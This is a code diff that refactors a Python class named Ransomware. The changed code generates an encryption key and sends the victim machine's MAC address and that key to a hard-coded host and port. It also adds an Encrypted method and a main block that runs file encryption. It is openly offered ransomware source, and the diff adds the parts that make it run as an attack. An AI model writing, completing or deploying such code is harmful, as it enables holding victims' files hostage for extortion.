@@ -1,18 +1,16 @@
-
 from time import sleep
 from modules.system import System
-from cryptography.fernet import Fernet
+from modules.crypto import generate_key, Fernet, Encrypt
 from socket import socket, AF_INET, SOCK_STREAM
-
-
 
 class Ransomware:
 
     def __init__(self, host: str, port: int) -> None:
+        self.key = generate_key()
         self.host = host
         self.port = port
+        self.system: System = System()
         self.server: socket = socket(AF_INET, SOCK_STREAM)
-        self.key = Fernet.generate_key()
         self.Private = Fernet(self.key)
 
 
@@ -21,7 +19,7 @@ class Ransomware:
         while not connected and retries < 3:
             try:
                 self.server.connect((self.host, self.port))
-                self.server.sendall(f'{self.Mac()}|{self.key.decode("utf-8")}'.encode('utf-8'))
+                self.server.sendall(f'{self.system.mac()}|{self.key.decode("utf-8")}'.encode('utf-8'))
                 connected = True
             except:
                 retries += 1
@@ -31,3 +29,10 @@ class Ransomware:
                     System.reset()
             finally:
                 self.server.close()
+    
+    def Encrypted(self):
+        Encrypt(self.Private)
+
+if __name__ == '__main__':
+    bot = Ransomware('192.168.1.12', 19100)
+    bot.Encrypted()
